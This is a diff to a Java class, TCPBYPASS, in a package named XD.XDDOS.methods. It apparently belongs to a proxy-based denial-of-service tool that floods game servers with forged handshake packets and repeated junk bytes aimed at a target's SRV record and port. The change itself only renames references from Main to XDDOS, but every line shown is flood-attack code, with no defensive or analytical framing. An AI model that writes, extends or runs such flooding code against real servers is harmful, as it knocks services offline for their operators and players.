@@ -1,6 +1,6 @@
 package XD.XDDOS.methods;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.Handshake;
@@ -15,7 +15,7 @@ import java.io.IOException;
 import java.util.zip.Deflater;
 
 public class TCPBYPASS implements Method {
-  private Handshake handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
+  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
   
   private byte[] bytes = this.handshake.getWrappedPacket();
   
@@ -32,16 +32,16 @@ public class TCPBYPASS implements Method {
           bbbb.write(0);
           bbbb.write(-6);
           bbbb.write(13950);
-          bbbb.writeBytes(Main.srvRecord);
-          bbbb.writeUTF(Main.srvRecord);
+          bbbb.writeBytes(XDDOS.srvRecord);
+          bbbb.writeUTF(XDDOS.srvRecord);
           bbbb.write(0);
           bbbb.write(-1);
           bbbb.write(2626);
           bbbb.write(0);
           bbbb.write(-6);
           bbbb.write(13950);
-          bbbb.writeBytes(Main.srvRecord);
-          bbbb.writeUTF(Main.srvRecord);
+          bbbb.writeBytes(XDDOS.srvRecord);
+          bbbb.writeUTF(XDDOS.srvRecord);
           i++;
         } 
       } 
